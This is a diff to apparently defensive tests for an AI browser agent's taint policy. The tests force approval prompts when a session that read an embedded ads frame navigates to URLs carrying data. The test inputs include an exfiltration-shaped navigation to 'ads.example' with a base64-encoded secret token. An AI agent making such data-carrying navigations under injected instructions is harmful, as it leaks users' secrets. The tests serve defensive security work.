@@ -98,18 +98,24 @@ describe('taint cannot be steered by an embedded frame', () => {
     expect(policy.get('s')).toMatchObject({ lastReadOrigin: 'https://mail.example', sources: ['https://ads.example', 'https://mail.example'] })
     const navigate = call('browser_navigate', { url: 'https://ads.example/c?d=c2VjcmV0LXRva2VuLXZhbHVlLTEyMzQ1Njc4OTA' })
     expect(policy.hook('nav', 's', true)(navigate, callPolicyTargets(navigate, FRAMES)).kind).toBe('force')
-    // The same data-carrying URL back on the page actually read is not the exfiltration shape.
+    // The top page is not exempt either: the session also read ads.example, so
+    // a data-carrying URL is exempt only when every source is its origin.
     const home = call('browser_navigate', { url: 'https://mail.example/search?q=c2VjcmV0LXRva2VuLXZhbHVlLTEyMzQ1Njc4OTA' })
-    expect(policy.hook('home', 's', true)(home, callPolicyTargets(home, FRAMES)).kind).toBe('trust')
+    expect(policy.hook('home', 's', true)(home, callPolicyTargets(home, FRAMES)).kind).toBe('force')
+    const other = new PolicyRuntime({ settings: () => ({ siteRules: [], siteDefaultsEnabled: true }), unrestricted: () => true, clearBridgeTaint: async () => {} })
+    await other.ready
+    other.hook('snap', 't', true)(call('browser_snapshot'), callPolicyTargets(call('browser_snapshot'), [FRAMES[0]!]))
+    other.recordResult({ id: 'snap', name: 'browser_snapshot', sessionId: 't' }, true)
+    expect(other.hook('home', 't', true)(home, callPolicyTargets(home, FRAMES)).kind).toBe('trust')
   })
 })
 
 describe('policy targets and forced prompts', () => {
   it('classifies reads, actions, and navigation', () => {
     const page = 'https://mail.example'
-    expect(callPolicyTargets(call('browser_snapshot'), FRAMES)).toEqual({ reads: ['https://ads.example', 'https://mail.example'], acts: [], pageOrigin: page })
-    expect(callPolicyTargets(call('browser_get_text', { frame: 3 }), FRAMES)).toEqual({ reads: ['https://ads.example'], acts: [], pageOrigin: page })
-    expect(callPolicyTargets(call('browser_click', { index: 1 }), FRAMES)).toEqual({ reads: [], acts: ['https://mail.example'], pageOrigin: page })
+    expect(callPolicyTargets(call('browser_snapshot'), FRAMES)).toEqual({ reads: ['https://ads.example', 'https://mail.example'], acts: [], urls: ['https://ads.example/frame', 'https://mail.example/inbox'], pageOrigin: page })
+    expect(callPolicyTargets(call('browser_get_text', { frame: 3 }), FRAMES)).toEqual({ reads: ['https://ads.example'], acts: [], urls: ['https://ads.example/frame'], pageOrigin: page })
+    expect(callPolicyTargets(call('browser_click', { index: 1 }), FRAMES)).toEqual({ reads: [], acts: ['https://mail.example'], urls: ['https://mail.example/inbox'], pageOrigin: page })
     expect(callPolicyTargets(call('browser_type', { index: 1, text: 'x' }), FRAMES)).toMatchObject({ typeTargetOrigin: 'https://mail.example' })
     expect(callPolicyTargets(call('browser_navigate', { url: 'https://x.example/' }), FRAMES)).toEqual({ reads: [], acts: [], destination: 'https://x.example/' })
     expect(callPolicyTargets(call('browser_clipboard', { action: 'write', text: 'x' }), FRAMES)).toEqual({ reads: [], acts: [], pageOrigin: page })
